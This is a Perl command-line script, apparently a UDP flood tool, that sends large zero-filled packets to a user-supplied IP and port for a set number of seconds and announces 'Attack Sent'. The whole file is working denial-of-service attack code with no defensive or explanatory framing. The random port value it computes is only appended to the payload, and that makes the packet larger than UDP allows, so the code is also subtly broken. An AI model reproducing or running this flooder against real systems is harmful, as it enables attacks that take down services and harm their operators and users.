#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

my $target_ip = $ARGV[0];
my $target_port = $ARGV[1];
my $attack_time = $ARGV[2];

die "Usage: perl udp.pl IP PORT TIME\n" unless defined($target_ip) && defined($target_port) && defined($attack_time);

my $packet_len = 65535;
my $socket = IO::Socket::INET->new(
    Proto    => 'udp',
    PeerAddr => $target_ip,
    PeerPort => $target_port,
) or die "Failed to create socket: $!\n";

print "Attack Sent to $target_ip:$target_port for $attack_time seconds...\n";

my $start_time = time();
my $end_time = $start_time + $attack_time;

while (time() < $end_time) {
    my $packet = generate_packet();
    $socket->send($packet);
}

$socket->close();

sub generate_packet {
    my $data = "\x00" x $packet_len;
    my $dport = int(rand(65535));
    return $data . pack("n", $dport);
}